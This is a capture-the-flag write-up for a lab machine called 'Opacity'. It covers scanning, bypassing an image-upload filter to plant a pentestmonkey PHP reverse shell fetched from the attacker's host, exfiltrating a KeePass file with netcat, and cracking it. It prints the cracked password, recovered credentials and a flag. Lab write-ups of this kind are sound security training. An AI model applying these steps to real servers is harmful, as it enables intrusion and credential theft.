# Opacity
(flags are at the end of the writeup)

### Opacity
Initial scan shows ports 22,80,139 and 445 open, and ports 9485, 11972 and 15370 filtered:

    # Nmap 7.94SVN scan initiated Wed Oct 30 06:32:33 2024 as: nmap -p22,80,139,445,9485,11972,15370 -sV -sC -oN scan 10.10.40.162
    Nmap scan report for 10.10.40.162
    Host is up (0.067s latency).
    
    PORT      STATE  SERVICE     VERSION
    22/tcp    open   ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 0f:ee:29:10:d9:8e:8c:53:e6:4d:e3:67:0c:6e:be:e3 (RSA)
    |   256 95:42:cd:fc:71:27:99:39:2d:00:49:ad:1b:e4:cf:0e (ECDSA)
    |_  256 ed:fe:9c:94:ca:9c:08:6f:f2:5c:a6:cf:4d:3c:8e:5b (ED25519)
    80/tcp    open   http        Apache httpd 2.4.41 ((Ubuntu))
    | http-title: Login
    |_Requested resource was login.php
    | http-cookie-flags: 
    |   /: 
    |     PHPSESSID: 
    |_      httponly flag not set
    |_http-server-header: Apache/2.4.41 (Ubuntu)
    139/tcp   open   netbios-ssn Samba smbd 4.6.2
    445/tcp   open   netbios-ssn Samba smbd 4.6.2
    9485/tcp  closed unknown
    11972/tcp closed unknown
    15370/tcp closed unknown
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    Host script results:
    |_clock-skew: -1h00m52s
    |_nbstat: NetBIOS name: OPACITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
    | smb2-time: 
    |   date: 2024-10-30T09:32:00
    |_  start_date: N/A
    | smb2-security-mode: 
    |   3:1:1: 
    |_    Message signing enabled but not required

Gobuster finds `/cloud` directory on the webserver: `gobuster dir -u http://10.10.40.162 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt`<br />
![image](https://github.com/user-attachments/assets/bbd215c0-4ffa-4411-a220-61147005a489)<br />
This page allows us to upload images. There's a filter that only allows strings ending with `.jpg` or `.png`. But we can upload a php file by simply adding a space before `.jpg`, like so: `http://10.11.108.100/revshell.php .jpg`. Open a python webserver on the attacker's machine and upload a php reverse shell. I used the one from [pentest monkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). Then open a netcat listener and visit `http://10.10.9.20/cloud/images/revshell.php`:<br />
![image](https://github.com/user-attachments/assets/58ff0220-c304-49f6-81d4-1fb2fa4ecf57)<br />
Inside `/opt` there's a KeyPass file:<br />
![image](https://github.com/user-attachments/assets/527e2e1d-e1ed-4691-a814-b31379d4be3c)<br />
So I transfered this file on my machine using netcat. And I used john to extract the hash of the password that protects this database: `keepass2john dataset.kdbx > hash.txt`. <br />
![image](https://github.com/user-attachments/assets/4ce0d56d-7bbd-4149-a788-aac3fafb1c87)<br />
Then run `john hash.txt` to crack it:<br />
![image](https://github.com/user-attachments/assets/c83e5b61-f7f0-40fe-86e8-f2628153b1a5)<br />
Now we can open the database with the following command: `keepassxc-cli open dataset.kdbx` and prompt `741852963` as password.<br />
![image](https://github.com/user-attachments/assets/385b27b8-c68c-4cbb-96d6-b122e57be292)<br />
To look at the password, add the `-s` flag:<br />
![image](https://github.com/user-attachments/assets/0944e2f0-b692-44a7-af9d-ecd504e0ddc0)<br />
Creds found: `sysadmin:Cl0udP4ss40p4city#8700`.







- What is the  local.txt flag? `6661b61b44d234d230d06bf5b3c075e2`
- What is the proof.txt flag? ``
